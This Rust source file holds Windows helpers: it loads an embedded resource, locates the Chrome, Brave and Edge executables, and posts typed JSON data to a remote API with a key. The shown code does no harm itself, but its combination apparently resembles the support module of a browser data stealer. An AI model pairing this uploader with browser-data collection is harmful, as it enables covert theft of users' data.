use anyhow::{Result, anyhow};
use std::path::PathBuf;
use winapi::shared::ntdef::NTSTATUS;

use crate::{API_KEY, BASE_API_URL};

pub fn get_embedded_resource(name: &str, _resource_type: &str) -> Result<Vec<u8>> {
    unsafe {
        use winapi::shared::minwindef::WORD;
        use winapi::um::libloaderapi::*;
        use winapi::um::winuser::{MAKEINTRESOURCEW, RT_RCDATA};

        let module = GetModuleHandleW(std::ptr::null());
        if module.is_null() {
            return Err(anyhow!("Failed to get module handle"));
        }

        // Convert name and type to wide strings
        let name_wide: Vec<u16> = name.encode_utf16().chain(Some(0)).collect();
        let resource = FindResourceW(
            module,
            name_wide.as_ptr(),
            MAKEINTRESOURCEW(RT_RCDATA as WORD),
        );
        if resource.is_null() {
            return Err(anyhow!("Failed to find embedded resource: {}", name));
        }

        let resource_handle = LoadResource(module, resource);
        if resource_handle.is_null() {
            return Err(anyhow!("Failed to load embedded resource: {}", name));
        }

        let resource_data = LockResource(resource_handle);
        if resource_data.is_null() {
            return Err(anyhow!("Failed to lock embedded resource: {}", name));
        }

        let resource_size = SizeofResource(module, resource);
        if resource_size == 0 {
            return Err(anyhow!("Resource has zero size: {}", name));
        }

        let data_slice =
            std::slice::from_raw_parts(resource_data as *const u8, resource_size as usize);

        Ok(data_slice.to_vec())
    }
}

pub fn ntstatus_to_string(status: NTSTATUS) -> String {
    format!("0x{:08X}", status as u32)
}

pub fn get_chrome_executable_path() -> Result<PathBuf> {
    // Common Chrome installation paths
    let paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    ];

    for path in &paths {
        let path_buf = PathBuf::from(path);
        if path_buf.exists() {
            return Ok(path_buf);
        }
    }

    // Try registry lookup
    get_browser_path_from_registry("Google\\Chrome")
}

pub fn get_brave_executable_path() -> Result<PathBuf> {
    // Common Brave installation paths
    let paths = [
        r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
    ];

    for path in &paths {
        let path_buf = PathBuf::from(path);
        if path_buf.exists() {
            return Ok(path_buf);
        }
    }

    get_browser_path_from_registry("BraveSoftware\\Brave-Browser")
}

pub fn get_edge_executable_path() -> Result<PathBuf> {
    // Common Edge installation paths
    let paths = [
        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
    ];

    for path in &paths {
        let path_buf = PathBuf::from(path);
        if path_buf.exists() {
            return Ok(path_buf);
        }
    }

    get_browser_path_from_registry("Microsoft\\Edge")
}

fn get_browser_path_from_registry(browser_key: &str) -> Result<PathBuf> {
    use std::ffi::OsString;
    use std::os::windows::ffi::OsStringExt;
    use winapi::shared::minwindef::*;
    use winapi::shared::winerror::ERROR_SUCCESS;
    use winapi::um::winnt::KEY_READ;
    use winapi::um::winreg::*;

    unsafe {
        let mut key: HKEY = std::ptr::null_mut();
        let subkey = format!(
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\{}\\shell\\open\\command",
            browser_key
        );
        let subkey_wide: Vec<u16> = subkey.encode_utf16().chain(Some(0)).collect();

        let result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            subkey_wide.as_ptr(),
            0,
            KEY_READ,
            &mut key,
        );

        if result != (ERROR_SUCCESS as i32) {
            return Err(anyhow!("Failed to open registry key for browser path"));
        }

        let mut buffer = [0u16; 512];
        let mut buffer_size = (buffer.len() * 2) as u32;

        let result = RegQueryValueExW(
            key,
            std::ptr::null(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            buffer.as_mut_ptr() as *mut u8,
            &mut buffer_size,
        );

        RegCloseKey(key);

        if result != (ERROR_SUCCESS as i32) {
            return Err(anyhow!("Failed to read browser path from registry"));
        }

        let path_str = OsString::from_wide(&buffer[..(buffer_size as usize) / 2]);
        let path = PathBuf::from(path_str.to_string_lossy().trim_end_matches('\0'));

        if path.exists() {
            Ok(path)
        } else {
            Err(anyhow!("Browser executable not found at registry path"))
        }
    }
}

pub async fn post_json_to_api<T: serde::Serialize>(
    data: &T,
    data_type: &str,
) -> anyhow::Result<()> {
    use reqwest::Client;
    use serde_json::json;

    let client = Client::new();
    let url = format!("{}api/{}?key={}", BASE_API_URL.as_str(), data_type.to_lowercase(), API_KEY.as_str());

    // Build the JSON payload with new structure
    let payload = json!({
        "data": data,
        "datatype": data_type
    });

    let resp = client
        .post(url)
        .header("Content-Type", "application/json")
        .json(&payload)
        .send()
        .await;

    match resp {
        Ok(r) if r.status().is_success() => {
            println!("{} JSON posted successfully!", data_type);
            Ok(())
        }
        Ok(r) => {
            eprintln!("Failed to post {} JSON: {}", data_type, r.status());
            Err(anyhow::anyhow!("Failed to post JSON: {}", r.status()))
        }
        Err(e) => {
            eprintln!("Failed to post {} JSON: {}", data_type, e);
            Err(anyhow::anyhow!("Failed to post JSON: {}", e))
        }
    }
}

pub fn post_json_to_api_blocking<T: serde::Serialize>(
    data: &T,
    data_type: &str,
) -> anyhow::Result<()> {
    use reqwest::blocking::Client;
    use serde_json::json;

    let client = Client::new();
    let url = format!("{}api/{}?key={}", BASE_API_URL.as_str(), data_type.to_lowercase(), API_KEY.as_str());

    let payload = json!({
        "data": data,
        "datatype": data_type
    });

    let resp = client
        .post(&url)
        .header("Content-Type", "application/json")
        .json(&payload)
        .send();

    match resp {
        Ok(r) if r.status().is_success() => {
            println!("{} JSON posted successfully (blocking)!", data_type);
            Ok(())
        }
        Ok(r) => {
            eprintln!("Failed to post {} JSON: {}", data_type, r.status());
            Err(anyhow::anyhow!("Failed to post JSON: {}", r.status()))
        }
        Err(e) => {
            eprintln!("Failed to post {} JSON: {}", data_type, e);
            Err(anyhow::anyhow!("Failed to post JSON: {}", e))
        }
    }
}
